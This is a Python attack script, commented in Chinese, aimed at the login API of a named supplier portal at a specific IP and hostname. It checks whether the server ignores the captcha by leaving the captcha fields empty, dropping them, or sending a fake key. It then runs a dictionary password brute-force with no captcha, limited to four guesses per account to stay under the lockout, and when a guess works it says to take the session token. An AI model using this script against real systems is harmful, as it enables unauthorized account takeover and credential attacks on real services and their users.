#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
易售SUP 供货商端 /api/supplier/Login/Verify —— 服务端不校验行为验证码
适用：易售/易信 SUP 家族 supplier 门户（Go 后端），前端 chunk 里 handleLogin 只判 captchaVerified

判定要点
  1) captcha / captcha_key 置空串 → 仍进入口令判定
  2) 整个 captcha 字段省略     → 仍进入口令判定
  3) 传真实 captcha_key 无票根 → 仍进入口令判定
  三者响应一致（默认文案「账号或密码错误(若连续错误5次将被禁止登录，需联系管理员于中控端解禁)」）
  = 行为验证码仅在前端生效，登录口可无验证码爆破。

用法
  python yishou_sup_supplier_login_captcha_bypass.py --ip 154.12.24.246 --host supplier.yhj.lol --probe
  python yishou_sup_supplier_login_captcha_bypass.py --ip 154.12.24.246 --host supplier.yhj.lol \
      --accounts admin,supplier --dict pw.txt --delay 1.2

注意
  - 必须带 Host 头（SNI 闸按 Host 分流），纯 IP 直连
  - 自签证书 → verify=False；本机代理 → trust_env=False / 环境无 http_proxy
  - 服务端每账号 5 次锁定，锁后响应与口令错不可区分，单账号最多 4 发
"""
import argparse
import json
import ssl
import sys
import time
import urllib.request


def build_body(account, password, mode):
    if mode == "empty":
        return {"account": account, "password": password, "captcha": "", "captcha_key": ""}
    if mode == "omit":
        return {"account": account, "password": password}
    if mode == "fakekey":
        # 真实格式的雪花 ID，但没有对应票根
        return {"account": account, "password": password,
                "captcha": "", "captcha_key": "1793949536802004226"}
    raise ValueError(mode)


def post(url, host, body, timeout=10):
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Host", host)
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({}),          # 禁用环境代理
        urllib.request.HTTPSHandler(context=ctx),
    )
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", required=True, help="目标 IP，如 154.12.24.246")
    ap.add_argument("--host", required=True, help="绑定的 vhost，如 supplier.yhj.lol")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--scheme", default="https")
    ap.add_argument("--path", default="/api/supplier/Login/Verify")
    ap.add_argument("--probe", action="store_true", help="只做三种验证码形态的绕过判定")
    ap.add_argument("--accounts", default="admin", help="逗号分隔账号")
    ap.add_argument("--dict", help="口令字典文件，一行一个")
    ap.add_argument("--delay", type=float, default=1.2, help="请求间隔秒")
    ap.add_argument("--banner", default="账号或密码错误", help="口令错时的响应特征子串")
    a = ap.parse_args()

    url = f"{a.scheme}://{a.ip}:{a.port}{a.path}"

    if a.probe:
        for mode in ("empty", "omit", "fakekey"):
            st, txt = post(url, a.host, build_body("admin", "x", mode))
            print(f"[{mode:8}] HTTP {st} {txt[:200]}")
            time.sleep(a.delay)
        print("\n判据：三条都出现口令错误文案 => 验证码未被服务端校验，绕过成立")
        print("     出现验证码相关文案（请先完成安全验证 / 验证码错误）=> 未绕过")
        return

    if not a.dict:
        sys.exit("需要 --dict 或 --probe")

    pwds = [l.strip() for l in open(a.dict, encoding="utf-8", errors="replace") if l.strip()]
    for acc in [x.strip() for x in a.accounts.split(",") if x.strip()]:
        budget = pwds[:4]          # 每账号 5 次锁定 → 实际只用 4 次
        for pwd in budget:
            st, txt = post(url, a.host, build_body(acc, pwd, "omit"))
            hit = a.banner not in txt and '"code":0' in txt.replace(" ", "")
            print(f"[{'HIT ' if hit else 'miss'}] {acc}:{pwd} HTTP {st} {txt[:160]}")
            if hit:
                print("=> 登录成功，拿 data 里的 token 继续")
                return
            time.sleep(a.delay)
        print(f"[info] {acc} 预算已用尽（避免触发 5 次锁定）")


if __name__ == "__main__":
    main()
